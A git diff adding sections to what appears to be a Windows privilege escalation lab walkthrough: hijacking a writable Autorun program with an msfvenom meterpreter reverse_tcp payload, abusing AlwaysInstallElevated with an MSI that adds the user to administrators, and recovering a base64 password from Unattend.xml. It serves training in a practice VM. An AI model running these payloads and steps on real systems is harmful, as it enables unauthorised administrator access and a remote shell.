@@ -167,3 +167,73 @@ x86_64-w64-mingw32-gcc windows_service.c -o x.exe
 8. As we can see our user has been added in the administrators group.
 
 ![0](images/reg/6.png)
+
+- - -
+## Registry (Autorun)
+1. Open command prompt and type: ```C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe``` or run Sherlock, you'll find a autoron program in “C:\Program Files\Autorun Program\program.exe”
+
+![0](images/autorun/1.png)
+
+2. In command prompt type: ```C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe –wvu "C:\Program Files\Autorun Program"```,
+notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the “program.exe” file.
+
+![0](images/autorun/1.1.png)
+
+3. Open terminal in your attacker machine and create a payload 
+```msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe```
+
+![0](images/autorun/2.png)
+
+4. Now transfer the program.exe in your windows machine.
+
+![0](images/autorun/4.png)
+
+5. Open another tab in terminal and start a listener in metasploit.
+
+![0](images/autorun/3.png)
+
+6. To simulate the privilege escalation effect, logoff and then log back on as an administrator user.
+
+7. Wait for a new session to open in Metasploit.
+
+![0](images/autorun/5.png)
+![0](images/autorun/6.png)
+
+- - -
+## Registry (AlwaysInstallElevated)
+1. Open command prompt and type ```reg query HKLM\Software\Policies\Microsoft\Windows\Installer```, notice that “AlwaysInstallElevated” value is 1.
+
+2. Open command prompt and type ```reg query HKCU\Software\Policies\Microsoft\Windows\Installer```, notice that “AlwaysInstallElevated” value is 1.
+
+![0](images/elevated/1.png)
+
+3. Open command prompt in your kali machine and type: ```msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f msi-nouac -o setup.msi```
+
+![0](images/elevated/2.png)
+
+4. Copy the generated file, setup.msi, to the Windows VM
+
+![0](images/elevated/3.png)
+
+5. Open another tab in your kali machine and start a tcp handler.
+
+![0](images/elevated/4.png)
+
+6. Open command prompt and type: msiexec /quiet /qn /i C:\Temp\setup.msi
+
+![0](images/elevated/5.png)
+
+7. You'll receive the connection in metasploit.
+
+![0](images/elevated/6.png)
+
+- - -
+## Password Mining (Configuration Files)
+
+1. Open command prompt and type: ```notepad C:\Windows\Panther\Unattend.xml```, You will find a base64 encoded password.
+
+![0](images/savecred/1.png)
+
+2. Copy that and decode.
+
+![0](images/savecred/2.png)
